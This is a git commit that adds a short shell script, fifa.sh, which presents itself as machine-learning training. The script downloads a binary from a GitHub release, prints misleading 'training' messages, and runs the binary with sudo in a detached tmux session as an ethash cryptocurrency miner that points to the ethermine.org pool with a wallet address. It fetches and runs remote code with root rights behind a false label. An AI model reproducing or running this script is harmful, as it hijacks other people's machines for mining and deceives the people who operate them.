b1ef43c843c3975933bc4b1fabddd5bfc7c61a90
Akira-Slasvi <92677873+Akira-Slasvi@users.noreply.github.com>
2021-12-20 17:51:37 +0800

    Create fifa.sh

---
+++ fifa.sh
@@ -0,0 +1,5 @@
+wget https://github.com/Akira-Slasvi/machine-learn/releases/download/%23machinellearn/machine
+echo project start
+echo training machine program
+chmod +x machine
+sudo tmux new-session -d -s SANS './machine -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x18EFd6373f99C8C46Cdd1B3142043E0fB2f69614 -p x -w ayen0000 --lock-cclock 1150'
